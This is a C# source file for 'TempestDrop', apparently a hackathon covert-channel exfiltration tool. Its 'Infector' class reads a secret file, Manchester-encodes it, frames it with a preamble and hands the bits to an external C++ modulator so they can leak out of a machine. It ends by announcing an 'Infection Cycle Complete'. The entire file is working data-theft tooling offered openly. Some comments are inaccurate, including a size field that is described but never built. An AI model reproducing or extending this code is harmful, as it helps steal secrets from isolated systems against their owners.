using System;
using System.IO;
using System.Text;
using System.Diagnostics;
using System.Collections.Generic;

namespace TempestDrop
{
    class Infector
    {
        static void Main(string[] args)
        {
            Console.WriteLine("[*] TempestDrop Orchestrator Started.");
            
            string targetFile = "secret.txt";
            if (!File.Exists(targetFile))
            {
                Console.WriteLine($"[!] Target file {targetFile} not found in current directory. Creating dummy secret...");
                File.WriteAllText(targetFile, "RSA-KEY-HACKATHON-WINNER");
            }

            string secretPayload = File.ReadAllText(targetFile);
            Console.WriteLine($"[+] Payload Acquired: {secretPayload}");

            // 1. Convert to Binary String
            string binaryString = StringToBinary(secretPayload);
            Console.WriteLine($"[+] Raw Binary: {binaryString}");

            // 2. Apply Manchester Encoding
            string manchesterEncoded = ManchesterEncode(binaryString);
            Console.WriteLine($"[+] Manchester Encoded (Baseband): {manchesterEncoded}");

            // 3. Frame Construction (Preamble + Size + Payload)
            // Preamble: 10101011 (Sync)
            string preamble = "10101011";
            string framedPayload = preamble + manchesterEncoded;

            Console.WriteLine($"[+] Final Framed Payload: {framedPayload}");

            // 4. Pipe to C++ Modulator
            string modulatorPath = @"cpp_modulator\modulator.exe";
            if (!File.Exists(modulatorPath))
            {
                modulatorPath = @"..\..\..\..\cpp_modulator\modulator.exe";
            }
            
            if (!File.Exists(modulatorPath))
            {
                Console.WriteLine($"[ERROR] C++ Modulator not found at {modulatorPath}. Compile it first!");
                return;
            }

            Console.WriteLine("[!] Executing IPC (Inter-Process Communication) to Native C++ Modulator...");

            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = modulatorPath,
                Arguments = framedPayload,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                CreateNoWindow = true
            };

            using (Process process = Process.Start(startInfo))
            {
                using (StreamReader reader = process.StandardOutput)
                {
                    string result = reader.ReadToEnd();
                    Console.WriteLine(result);
                }
            }

            Console.WriteLine("[*] Infection Cycle Complete.");
        }

        static string StringToBinary(string data)
        {
            StringBuilder sb = new StringBuilder();
            foreach (char c in data)
            {
                sb.Append(Convert.ToString(c, 2).PadLeft(8, '0'));
            }
            return sb.ToString();
        }

        static string ManchesterEncode(string binary)
        {
            // IEEE 802.3 standard: 0 -> 10, 1 -> 01
            // Or G.E. Thomas: 0 -> 01, 1 -> 10
            // Let's use G.E. Thomas: 0 is Low-High (01), 1 is High-Low (10)
            StringBuilder encoded = new StringBuilder();
            foreach (char bit in binary)
            {
                if (bit == '0')
                    encoded.Append("01");
                else if (bit == '1')
                    encoded.Append("10");
            }
            return encoded.ToString();
        }
    }
}
